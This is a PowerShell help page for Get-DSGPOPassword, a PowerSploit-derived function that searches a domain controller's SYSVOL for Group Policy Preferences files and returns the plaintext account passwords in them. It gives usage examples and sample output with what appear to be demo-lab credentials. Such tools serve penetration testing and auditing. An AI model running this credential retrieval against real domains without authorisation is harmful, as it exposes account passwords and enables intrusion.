---
external help file: PSAD-help.xml
online version: http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
schema: 2.0.0
---

# Get-DSGPOPassword

## SYNOPSIS
Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.

## SYNTAX

```
Get-DSGPOPassword [[-Server] <String>]
```

## DESCRIPTION
Get-DSGPOPassword searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.

## EXAMPLES

### -------------------------- EXAMPLE 1 --------------------------
```
Get-DSGPOPassword
```

NewName   : \[BLANK\]
Changed   : {2014-02-21 05:28:53}
Passwords : {password12}
UserNames : {test1}
File      : \\\\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\DataSources.xml
NewName   : {mspresenters}
Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
Passwords : {Recycling*3ftw!, password123, password1234}
UserNames : {Administrator (built-in), DummyAccount, dummy2}
File      : \\\\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
NewName   : \[BLANK\]
Changed   : {2014-02-21 05:29:53, 2014-02-21 05:29:52}
Passwords : {password, password1234$}
UserNames : {administrator, admin}
File      : \\\\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml
NewName   : \[BLANK\]
Changed   : {2014-02-21 05:30:14, 2014-02-21 05:30:36}
Passwords : {password, read123}
UserNames : {DEMO\Administrator, admin}
File      : \\\\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\Services.xml

### -------------------------- EXAMPLE 2 --------------------------
```
Get-DSGPOPassword -Server EXAMPLE.COM
```

NewName   : \[BLANK\]
Changed   : {2014-02-21 05:28:53}
Passwords : {password12}
UserNames : {test1}
File      : \\\\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB982DA}\MACHINE\Preferences\DataSources\DataSources.xml
NewName   : {mspresenters}
Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
Passwords : {Recycling*3ftw!, password123, password1234}
UserNames : {Administrator (built-in), DummyAccount, dummy2}
File      : \\\\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB9AB12}\MACHINE\Preferences\Groups\Groups.xml

### -------------------------- EXAMPLE 3 --------------------------
```
Get-DSGPOPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
```

password
password12
password123
password1234
password1234$
read123
Recycling*3ftw!

## PARAMETERS

### -Server
Specify the domain controller to search for.
Default's to the users current domain

```yaml
Type: String
Parameter Sets: (All)
Aliases: 

Required: False
Position: 1
Default value: $Env:USERDNSDOMAIN
Accept pipeline input: False
Accept wildcard characters: False
```

## INPUTS

## OUTPUTS

## NOTES
Original function from PowerSploit: Get-DSGPOPassword
Author: Chris Campbell (@obscuresec)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

## RELATED LINKS

[http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html](http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html)

[https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-DSGPOPassword.ps1](https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-DSGPOPassword.ps1)

[http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences](http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences)

[http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html](http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html)

